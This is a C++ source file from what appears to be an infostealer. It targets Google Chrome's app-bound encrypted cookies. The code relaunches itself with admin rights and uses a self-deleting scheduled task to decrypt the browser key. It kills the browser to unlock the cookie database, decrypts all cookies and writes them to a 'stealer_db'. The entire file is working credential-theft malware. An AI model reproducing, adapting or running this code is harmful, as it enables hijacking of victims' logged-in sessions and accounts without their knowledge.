#include "includes\AppBoundKeyParser.h"
#include "includes\Helper.h"
#include "includes\AppBoundKeyDecryptor.h"
#include "includes\TaskService.h"

std::string app_bound_browser_paths = "AppData\\Local\\";
std::vector<std::string> browsers_app_bound = {
	//"Microsoft\\Edge\\",
	//"BraveSoftware\\Brave-Browser",
	"Google\\Chrome\\"
};

BOOL app_bound_browsers_cookie_collector(std::string username, std::string stealer_db, BOOL service, std::string service_parameter)
{
	if (!CheckProcessPriv())
	{
		std::cerr << "Admin Privileges Required !!!" << std::endl;
		RestartAsAdmin("-app-bound-decryption");
	}

	if (service)
	{
		AppBoundKeyDecryptor key_obj;
		std::string target_user_data;
		std::string target_key_data;

		// Those paths that contains \\ at the end means they have the default file 'User Data'
		// Those paths that doesn't contain \\ at the end means they are the data directories themselves
		for (const auto& dir : browsers_app_bound) {
			if (dir.back() == '\\')
				target_user_data = "C:\\users\\" + service_parameter + "\\" + app_bound_browser_paths + dir + "User Data";
			else
			{
				// in case of opera, the login data is in roaming instead of local
				if (dir.find("Opera") != std::string::npos)
					target_user_data = "C:\\users\\" + service_parameter + "\\" + "AppData\\Roaming\\" + dir;
				else
					target_user_data = "C:\\users\\" + service_parameter + "\\" + app_bound_browser_paths + dir;
			}

			target_key_data = target_user_data + "\\Local State";
			if (!key_obj.SetupService(target_key_data, dir))
				exit(1);
		}
		exit(0);
	}

	std::wstring TaskName = StringToWString("shaddy43");
	std::wstring Path = GetExecutablePath();
	std::string combine_arg = "-app-bound-decryption -service " + username;
	std::wstring Argument = StringToWString(combine_arg);

	if (!CreateScheduledTask(TaskName, Path, Argument))
		return false;

	Sleep(500);
	if (!RunScheduledTask(TaskName))
		return false;

	Sleep(1000);
	DeleteScheduledTask(TaskName);

	std::vector<DataHolder> data_list;
	std::string target_user_data;
	std::string target_cookie_data;

	// Those paths that contains \\ at the end means they have the default file 'User Data'
	// Those paths that doesn't contain \\ at the end means they are the data directories themselves
	for (const auto& dir : browsers_app_bound) {

		if (dir.back() == '\\')
			target_user_data = "C:\\users\\" + username + "\\" + app_bound_browser_paths + dir + "User Data";
		else
		{
			// in case of opera, the login data is in roaming instead of local
			if (dir.find("Opera") != std::string::npos)
				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
			else
				target_user_data = "C:\\users\\" + username + "\\" + app_bound_browser_paths + dir;
		}

		target_cookie_data = target_user_data + "\\Default\\Network\\Cookies";

		try {
			sqlite3_stmt* stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");

			if (stmt == nullptr)
			{
				// cookies file is locked when chromium based browser is running
				if (!kill_process(dir))
					continue;

				stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
				if (stmt == nullptr)
				{
					continue;
				}
			}

			//Decrypt key
			std::string service_data_path = "c:\\users";
			service_data_path += "\\public\\";
			service_data_path += "NTUSER.dat";
			AppBoundKeyDecryptor obj;
			if (obj.AppBoundDecryptorInit(service_data_path, dir))
			{
				while (sqlite3_step(stmt) == SQLITE_ROW)
				{
					DataHolder data;

					char* host_key = (char*)sqlite3_column_text(stmt, 0);
					char* name = (char*)sqlite3_column_text(stmt, 1);

					std::vector<BYTE> cookies;
					const void* encrypted_value = sqlite3_column_blob(stmt, 3);
					int encrypted_value_size = sqlite3_column_bytes(stmt, 3);
					char* expiry = (char*)sqlite3_column_text(stmt, 4);

					if (host_key != nullptr && name != nullptr && encrypted_value != nullptr && encrypted_value_size > 0) {
						// Assign the BLOB data to the std::vector<BYTE>
						cookies.assign((const BYTE*)encrypted_value, (const BYTE*)encrypted_value + encrypted_value_size);

						if ((strlen(host_key) == 0) || (strlen(name) == 0) || cookies.empty())
							continue;

						try
						{
							//decrypt cookies here
							std::string decrypted_cookies = obj.AESDecrypter(cookies);
							
							if (decrypted_cookies.empty())
								continue;

							if (decrypted_cookies.size() > 32) {
								decrypted_cookies.erase(0, 32);  // Remove the first 32 bytes
							}

							data.get_cookies_manager().setCookies(decrypted_cookies);
							data.get_cookies_manager().setUrl(host_key);
							data.get_cookies_manager().setCookieName(name);
							data.get_cookies_manager().setHost(dir);
							data.get_cookies_manager().setCookiesExpiry(expiry);
						}
						catch (int e)
						{
							continue;
						}

						data_list.push_back(data);
					}
					else {
						// Handle the case where the cookies_blob is null (no data)
						continue;
					}
				}
			}
			else
			{
				continue;
			}
		}
		catch (int e)
		{
			continue;
		}
	}

	if (data_list.size() == 0)
		return false;

	if (!dump_cookie_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}